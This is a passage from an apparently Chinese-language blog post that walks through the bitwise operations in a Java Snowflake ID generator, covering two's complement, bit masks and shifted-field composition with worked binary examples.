<span class="keyword">private</span> <span class="keyword">long</span> timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> sequenceMask = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; sequenceBits);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> lastTimestamp = -<span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getWorkerId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> workerId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getDatacenterId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> datacenterId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getTimestamp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> System.currentTimeMillis();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">long</span> <span class="title">nextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> timestamp = timeGen();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (timestamp &lt; lastTimestamp) &#123;</span><br><span class="line">            System.err.printf(<span class="string">"clock is moving backwards.  Rejecting requests until %d."</span>, lastTimestamp);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(String.format(<span class="string">"Clock moved backwards.  Refusing to generate id for %d milliseconds"</span>,</span><br><span class="line">                    lastTimestamp - timestamp));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lastTimestamp == timestamp) &#123;</span><br><span class="line">            sequence = (sequence + <span class="number">1</span>) &amp; sequenceMask;</span><br><span class="line">            <span class="keyword">if</span> (sequence == <span class="number">0</span>) &#123;</span><br><span class="line">                timestamp = tilNextMillis(lastTimestamp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sequence = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastTimestamp = timestamp;</span><br><span class="line">        <span class="keyword">return</span> ((timestamp - twepoch) &lt;&lt; timestampLeftShift) |</span><br><span class="line">                (datacenterId &lt;&lt; datacenterIdShift) |</span><br><span class="line">                (workerId &lt;&lt; workerIdShift) |</span><br><span class="line">                sequence;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">tilNextMillis</span><span class="params">(<span class="keyword">long</span> lastTimestamp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> timestamp = timeGen();</span><br><span class="line">        <span class="keyword">while</span> (timestamp &lt;= lastTimestamp) &#123;</span><br><span class="line">            timestamp = timeGen();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">timeGen</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> System.currentTimeMillis();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//---------------测试---------------</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IdWorker worker = <span class="keyword">new</span> IdWorker(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            System.out.println(worker.nextId());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="代码理解"><a href="#代码理解" class="headerlink" title="代码理解"></a>代码理解</h1><p>上面的代码中，有部分位运算的代码，如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sequence = (sequence + <span class="number">1</span>) &amp; sequenceMask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> maxWorkerId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; workerIdBits);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ((timestamp - twepoch) &lt;&lt; timestampLeftShift) |</span><br><span class="line">        (datacenterId &lt;&lt; datacenterIdShift) |</span><br><span class="line">        (workerId &lt;&lt; workerIdShift) |</span><br><span class="line">        sequence;</span><br></pre></td></tr></table></figure>

<p>为了能更好理解，我对相关知识研究了一下。</p>
<h2 id="负数的二进制表示"><a href="#负数的二进制表示" class="headerlink" title="负数的二进制表示"></a>负数的二进制表示</h2><p>在计算机中，负数的二进制是用 <strong>补码</strong> 来表示的。<br>假设我是用 Java 中的 int 类型来存储数字的，<br>int 类型的大小是 32 个二进制位（bit），即 4 个字节（byte）。（1 byte = 8 bit）<br>那么十进制数字<code>3</code>在二进制中的表示应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 00000011</span><br><span class="line">// 3 的二进制表示，就是原码</span><br></pre></td></tr></table></figure>

<p>那数字<code>-3</code>在二进制中应该如何表示？<br>我们可以反过来想想，因为 -3+3=0，<br>在二进制运算中<strong>把 -3 的二进制看成未知数 x 来求解</strong>，<br>求解算式的二进制表示如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   00000000 00000000 00000000 00000011 //3，原码</span><br><span class="line">+  xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx //-3，补码</span><br><span class="line">-----------------------------------------------</span><br><span class="line">   00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>

<p>反推 x 的值，3 的二进制加上什么值才使结果变成 <code>00000000 00000000 00000000 00000000</code>？：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   00000000 00000000 00000000 00000011 //3，原码</span><br><span class="line">+  11111111 11111111 11111111 11111101 //-3，补码</span><br><span class="line">-----------------------------------------------</span><br><span class="line"> 1 00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>

<p>反推的思路是 3 的二进制数从最低位开始逐位加 1，使溢出的 1 不断向高位溢出，直到溢出到第 33 位。然后由于 int 类型最多只能保存 32 个二进制位，所以最高位的 1 溢出了，剩下的 32 位就成了（十进制的）0。  </p>
<p><strong>补码的意义就是可以拿补码和原码（3的二进制）相加，最终加出一个 “溢出的 0”</strong>  </p>
<p>以上是理解的过程，实际中记住<strong>公式</strong>就很容易算出来：</p>
<ul>
<li>补码 = 反码 + 1</li>
<li>补码 = （原码 - 1）再取反码</li>
</ul>
<p>因此<code>-1</code>的二进制应该这样算：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000000 00000000 00000001 //原码：1 的二进制</span><br><span class="line">11111111 11111111 11111111 11111110 //取反码：1 的二进制的反码</span><br><span class="line">11111111 11111111 11111111 11111111 //加 1：-1 的二进制表示（补码）</span><br></pre></td></tr></table></figure>

<h2 id="用位运算计算-n-个-bit-能表示的最大数值"><a href="#用位运算计算-n-个-bit-能表示的最大数值" class="headerlink" title="用位运算计算 n 个 bit 能表示的最大数值"></a>用位运算计算 n 个 bit 能表示的最大数值</h2><p>比如这样一行代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> workerIdBits = <span class="number">5L</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> maxWorkerId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; workerIdBits);</span><br></pre></td></tr></table></figure>

<p>上面代码换成这样看方便一点：<br><code>long maxWorkerId = -1L ^ (-1L &lt;&lt; 5L)</code>  </p>
<p>咋一看真的看不准哪个部分先计算，于是查了一下Java运算符的优先级表：</p>
<figure class="image-box">
                <img src="974688567-59c21de65c521_articlex.png" alt title class>
                <p></p>
            </figure>

<p>所以上面那行代码中，运行顺序是：</p>
<ul>
<li>-1 左移 5，得结果 a</li>
<li>-1 异或 a</li>
</ul>
<p><code>long maxWorkerId = -1L ^ (-1L &lt;&lt; 5L)</code> 的二进制运算过程如下：  </p>
<p><strong>-1 左移 5，得结果 a</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      11111111 11111111 11111111 11111111 //-1 的二进制表示（补码）</span><br><span class="line">11111 11111111 11111111 11111111 11100000 //高位溢出的不要，低位补 0</span><br><span class="line">      11111111 11111111 11111111 11100000 //结果 a</span><br></pre></td></tr></table></figure>

<p><strong>-1 异或 a</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        11111111 11111111 11111111 11111111 //-1 的二进制表示（补码）</span><br><span class="line">    ^   11111111 11111111 11111111 11100000 //两个操作数的位中，相同则为 0，不同则为 1</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">        00000000 00000000 00000000 00011111 //最终结果 31</span><br></pre></td></tr></table></figure>

<p>最终结果是 31，二进制<code>00000000 00000000 00000000 00011111</code>转十进制可以这么算：<br>$$ 2^4+2^3+2^2+2^1+2^0=16+8+4+2+1=31 $$</p>
<p>那既然现在知道算出来<code>long maxWorkerId = -1L ^ (-1L &lt;&lt; 5L)</code>中的<code>maxWorkerId = 31</code>，有什么含义？为什么要用左移 5 来算？如果你看过<strong>概述</strong>部分，请找到这段内容看看：</p>
<blockquote>
<p><code>5 位(bit)</code>可以表示的最大正整数是 $2^5-1=31$，即可以用 0, 1, 2, 3, $\cdots$, 31 这 32 个数字，来表示不同的 datecenterId 或 workerId</p>
</blockquote>
<p><code>-1L ^ (-1L &lt;&lt; 5L)</code>结果是 31，$2^5-1$ 的结果也是 31，所以在代码中，<code>-1L ^ (-1L &lt;&lt; 5L)</code>的写法是<strong>利用位运算计算出 5 位能表示的最大正整数是多少</strong></p>
<h2 id="用-mask-防止溢出"><a href="#用-mask-防止溢出" class="headerlink" title="用 mask 防止溢出"></a>用 mask 防止溢出</h2><p>有一段有趣的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sequence = (sequence + <span class="number">1</span>) &amp; sequenceMask;</span><br></pre></td></tr></table></figure>

<p>分别用不同的值测试一下，你就知道它怎么有趣了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> seqMask = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; <span class="number">12L</span>); <span class="comment">//计算 12 位能存储的最大正整数，相当于：2^12-1 = 4095</span></span><br><span class="line">System.out.println(<span class="string">"seqMask: "</span>+seqMask);</span><br><span class="line">System.out.println(<span class="number">1L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">2L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">3L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">4L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">4095L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">4096L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">4097L</span> &amp; seqMask);</span><br><span class="line">System.out.println(<span class="number">4098L</span> &amp; seqMask);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">seqMask: 4095</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">4095</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>这段代码通过<code>位与</code>运算保证计算的结果范围始终是 0 - 4095 ！</strong></p>
<h2 id="用位运算汇总结果"><a href="#用位运算汇总结果" class="headerlink" title="用位运算汇总结果"></a>用位运算汇总结果</h2><p>还有另外一段诡异的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ((timestamp - twepoch) &lt;&lt; timestampLeftShift) |</span><br><span class="line">        (datacenterId &lt;&lt; datacenterIdShift) |</span><br><span class="line">        (workerId &lt;&lt; workerIdShift) |</span><br><span class="line">        sequence;</span><br></pre></td></tr></table></figure>

<p>为了弄清楚这段代码，  </p>
<p><strong>首先</strong> 需要计算一下相关的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> twepoch = <span class="number">1288834974657L</span>; <span class="comment">//起始时间戳，用于用当前时间戳减去这个时间戳，算出偏移量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> workerIdBits = <span class="number">5L</span>; <span class="comment">//workerId 占用的位数：5</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> datacenterIdBits = <span class="number">5L</span>; <span class="comment">//datacenterId 占用的位数：5</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> maxWorkerId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; workerIdBits);  <span class="comment">// workerId 可以使用的最大数值：31</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> maxDatacenterId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; datacenterIdBits); <span class="comment">// datacenterId 可以使用的最大数值：31</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> sequenceBits = <span class="number">12L</span>;<span class="comment">//序列号占用的位数：12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> workerIdShift = sequenceBits; <span class="comment">// 12</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> datacenterIdShift = sequenceBits + workerIdBits; <span class="comment">// 12+5 = 17</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits; <span class="comment">// 12+5+5 = 22</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> sequenceMask = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; sequenceBits);<span class="comment">//4095</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> lastTimestamp = -<span class="number">1L</span>;</span><br></pre></td></tr></table></figure>

<p><strong>其次</strong> 写个测试，把参数都写死，并运行打印信息，方便后面来核对计算结果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------测试---------------</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> timestamp = <span class="number">1505914988849L</span>;</span><br><span class="line">    <span class="keyword">long</span> twepoch = <span class="number">1288834974657L</span>;</span><br><span class="line">    <span class="keyword">long</span> datacenterId = <span class="number">17L</span>;</span><br><span class="line">    <span class="keyword">long</span> workerId = <span class="number">25L</span>;</span><br><span class="line">    <span class="keyword">long</span> sequence = <span class="number">0L</span>;</span><br><span class="line"></span><br><span class="line">    System.out.printf(<span class="string">"\ntimestamp: %d \n"</span>,timestamp);</span><br><span class="line">    System.out.printf(<span class="string">"twepoch: %d \n"</span>,twepoch);</span><br><span class="line">    System.out.printf(<span class="string">"datacenterId: %d \n"</span>,datacenterId);</span><br><span class="line">    System.out.printf(<span class="string">"workerId: %d \n"</span>,workerId);</span><br><span class="line">    System.out.printf(<span class="string">"sequence: %d \n"</span>,sequence);</span><br><span class="line">    System.out.println();</span><br><span class="line">    System.out.printf(<span class="string">"(timestamp - twepoch): %d \n"</span>,(timestamp - twepoch));</span><br><span class="line">    System.out.printf(<span class="string">"((timestamp - twepoch) &lt;&lt; 22L): %d \n"</span>,((timestamp - twepoch) &lt;&lt; <span class="number">22L</span>));</span><br><span class="line">    System.out.printf(<span class="string">"(datacenterId &lt;&lt; 17L): %d \n"</span> ,(datacenterId &lt;&lt; <span class="number">17L</span>));</span><br><span class="line">    System.out.printf(<span class="string">"(workerId &lt;&lt; 12L): %d \n"</span>,(workerId &lt;&lt; <span class="number">12L</span>));</span><br><span class="line">    System.out.printf(<span class="string">"sequence: %d \n"</span>,sequence);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> result = ((timestamp - twepoch) &lt;&lt; <span class="number">22L</span>) |</span><br><span class="line">            (datacenterId &lt;&lt; <span class="number">17L</span>) |</span><br><span class="line">            (workerId &lt;&lt; <span class="number">12L</span>) |</span><br><span class="line">            sequence;</span><br><span class="line">    System.out.println(result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 打印信息：</span></span><br><span class="line"><span class="comment">    timestamp: 1505914988849 </span></span><br><span class="line"><span class="comment">    twepoch: 1288834974657 </span></span><br><span class="line"><span class="comment">    datacenterId: 17 </span></span><br><span class="line"><span class="comment">    workerId: 25 </span></span><br><span class="line"><span class="comment">    sequence: 0 </span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    (timestamp - twepoch): 217080014192 </span></span><br><span class="line"><span class="comment">    ((timestamp - twepoch) &lt;&lt; 22L): 910499571845562368 </span></span><br><span class="line"><span class="comment">    (datacenterId &lt;&lt; 17L): 2228224 </span></span><br><span class="line"><span class="comment">    (workerId &lt;&lt; 12L): 102400 </span></span><br><span class="line"><span class="comment">    sequence: 0 </span></span><br><span class="line"><span class="comment">    910499571847892992</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>代入位移的值得之后，就是这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ((timestamp - <span class="number">1288834974657</span>) &lt;&lt; <span class="number">22</span>) |</span><br><span class="line">        (datacenterId &lt;&lt; <span class="number">17</span>) |</span><br><span class="line">        (workerId &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">        sequence;</span><br></pre></td></tr></table></figure>

<p>对于尚未知道的值，我们可以先看看<strong>概述</strong>中对 SnowFlake 结构的解释，再代入在合法范围的值（Windows系统可以用计算器方便计算这些值的二进制），来了解计算的过程。<br>当然，由于我的测试代码已经把这些值写死了，那直接用这些值来手工验证计算结果即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> timestamp = <span class="number">1505914988849L</span>;</span><br><span class="line"><span class="keyword">long</span> twepoch = <span class="number">1288834974657L</span>;</span><br><span class="line"><span class="keyword">long</span> datacenterId = <span class="number">17L</span>;</span><br><span class="line"><span class="keyword">long</span> workerId = <span class="number">25L</span>;</span><br><span class="line"><span class="keyword">long</span> sequence = <span class="number">0L</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">设：timestamp  = 1505914988849，twepoch = 1288834974657</span><br><span class="line">1505914988849 - 1288834974657 = 217080014192 (timestamp 相对于起始时间的毫秒偏移量)，其(a)二进制左移 22 位计算过程如下：                                </span><br><span class="line"></span><br><span class="line">                        |&lt;--这里开始左右 22 位                            ‭</span><br><span class="line">00000000 00000000 000000|00 00110010 10001010 11111010 00100101 01110000 // a = 217080014192</span><br><span class="line">00001100 10100010 10111110 10001001 01011100 00|000000 00000000 00000000 // a 左移 22 位后的值(la)</span><br><span class="line">                                               |&lt;--这里后面的位补 0</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设：datacenterId  = 17，其（b）二进制左移 17 位计算过程如下：</span><br><span class="line"></span><br><span class="line">                   |&lt;--这里开始左移 17 位    </span><br><span class="line">00000000 00000000 0|0000000 ‭00000000 00000000 00000000 00000000 00010001 // b = 17</span><br><span class="line">0000000‭0 00000000 00000000 00000000 00000000 0010001|0 00000000 00000000 // b 左移 17 位后的值(lb)</span><br><span class="line">                                                    |&lt;--这里后面的位补 0</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设：workerId  = 25，其（c）二进制左移 12 位计算过程如下：</span><br><span class="line"></span><br><span class="line">             |&lt;--这里开始左移 12 位    </span><br><span class="line">‭00000000 0000|0000 00000000 00000000 00000000 00000000 00000000 00011001‬ // c = 25</span><br><span class="line">00000000 00000000 00000000 00000000 00000000 00000001 1001|0000 00000000‬ // c 左移 12 位后的值(lc)                                                                 </span><br><span class="line">                                                          |&lt;--这里后面的位补 0</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">设：sequence = 0，其二进制如下：</span><br><span class="line"></span><br><span class="line">00000000 00000000 00000000 00000000 00000000 00000000 0000‭0000 00000000‬ // sequence = 0</span><br></pre></td></tr></table></figure>

<p>现在知道了每个部分左移后的值 (la, lb, lc)，代码可以简化成下面这样去理解：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ((timestamp - <span class="number">1288834974657</span>) &lt;&lt; <span class="number">22</span>) |</span><br><span class="line">        (datacenterId &lt;&lt; <span class="number">17</span>) |</span><br><span class="line">        (workerId &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">        sequence;</span><br><span class="line">-----------------------------</span><br><span class="line">           |</span><br><span class="line">           | 简化</span><br><span class="line">          \|/</span><br><span class="line">-----------------------------</span><br><span class="line"><span class="keyword">return</span> (la) |</span><br><span class="line">        (lb) |</span><br><span class="line">        (lc) |</span><br><span class="line">        sequence;</span><br></pre></td></tr></table></figure>

<p>上面的管道符号 <code>|</code> 在 Java 中也是一个位运算符。其含义是：<br><strong>x 的第 n 位和 y 的第 n 位 只要有一个是 1，则结果的第 n 位也为 1，否则为 0</strong>，因此，我们对四个数的<code>位或</code>运算如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 1  |                    41                        |  5  |   5  |     12      </span><br><span class="line">    </span><br><span class="line">   0|0001100 10100010 10111110 10001001 01011100 00|00000|0 0000|0000 00000000 //la</span><br><span class="line">   0|000000‭0 00000000 00000000 00000000 00000000 00|10001|0 0000|0000 00000000 //lb</span><br><span class="line">   0|0000000 00000000 00000000 00000000 00000000 00|00000|1 1001|0000 00000000 //lc</span><br><span class="line">or 0|0000000 00000000 00000000 00000000 00000000 00|00000|0 0000|‭0000 00000000‬ //sequence</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">   0|0001100 10100010 10111110 10001001 01011100 00|10001|1 1001|‭0000 00000000‬ //结果：910499571847892992</span><br></pre></td></tr></table></figure>

<p><strong>结果计算过程：</strong></p>
<ol>
<li><p>从至左列出 1 出现的下标（从 0 开始算）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0000  1   1   00  1   0  1  000  1   0  1  0  1  1  1  1  1  0 1   000 1 00 1  0 1  0   1  1  1  0000 1   000  1  1  1  00  1‭   0000 0000 0000</span><br><span class="line">      59  58      55     53      49     47    45 44 43 42 41   39      35   32   30     28 27 26      21       17 16 15     12</span><br></pre></td></tr></table></figure>
</li>
<li><p>各个下标作为 2 的幂数来计算，并相加：<br>$$ 2^{59}+2^{58}+2^{55}+2^{53}+2^{49}+2^{47}+2^{45}+2^{44}+2^{43}+2^{42}+2^{41}+ \\ 2^{39}+2^{35}+2^{32}+2^{30}+2^{28}+2^{27}+2^{26}+2^{21}+2^{17}+2^{16}+2^{15}+2^{12} $$</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    2^59&#125;  : 576460752303423488</span><br><span class="line">    2^58&#125;  : 288230376151711744</span><br><span class="line">    2^55&#125;  :  36028797018963968</span><br><span class="line">    2^53&#125;  :   9007199254740992</span><br><span class="line">    2^49&#125;  :    562949953421312</span><br><span class="line">    2^47&#125;  :    140737488355328</span><br><span class="line">    2^45&#125;  :     35184372088832</span><br><span class="line">    2^44&#125;  :     17592186044416</span><br><span class="line">    2^43&#125;  :      8796093022208</span><br><span class="line">    2^42&#125;  :      4398046511104</span><br><span class="line">    2^41&#125;  :      2199023255552</span><br><span class="line">    2^39&#125;  :       549755813888</span><br><span class="line">    2^35&#125;  :        34359738368</span><br><span class="line">    2^32&#125;  :         4294967296</span><br><span class="line">    2^30&#125;  :         1073741824</span><br><span class="line">    2^28&#125;  :          268435456</span><br><span class="line">    